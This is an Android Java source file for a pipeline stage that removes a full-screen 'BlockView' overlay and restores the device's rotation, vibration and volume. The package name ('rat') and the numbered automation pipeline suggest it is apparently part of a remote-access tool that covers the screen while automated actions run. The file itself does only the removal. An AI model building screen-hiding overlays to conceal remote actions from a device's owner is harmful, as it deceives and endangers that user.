package com.vendor.rat.auto.pipeline.stage;

import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import com.vendor.rat.auto.pipeline.PipelineContext;
import com.vendor.rat.auto.pipeline.PipelineStage;
import com.vendor.rat.helper.BlockViewHelper;

/**
 * Stage 9: 移除遮罩
 *
 * 移除全屏 BlockView 遮罩，恢复设备旋转/震动/音量。
 */
public class RemoveOverlayStage implements PipelineStage {

    private static final String TAG = "RemoveOverlayStage";

    @Override
    public void handle(PipelineContext passable, Runnable next) {
        // Skip if overlay is not showing
        if (!passable.isOverlayShowing() && !BlockViewHelper.isShowing()) {
            next.run();
            return;
        }

        if (!BlockViewHelper.isShowing()) {
            Log.d(TAG, "Overlay already removed");
            passable.setOverlayShowing(false);
            next.run();
            return;
        }

        // 必须在主线程移除 View
        if (Looper.myLooper() == Looper.getMainLooper()) {
            BlockViewHelper.removeViewInternal();
        } else {
            new Handler(Looper.getMainLooper()).post(BlockViewHelper::removeViewInternal);
            // 轮询等待移除完成
            for (int i = 0; i < 100 && BlockViewHelper.isShowing(); i++) {
                try { Thread.sleep(100); } catch (InterruptedException ignored) {}
            }
        }

        passable.setOverlayShowing(false);
        Log.d(TAG, "Overlay removed, device state restored");
        next.run();
    }
}
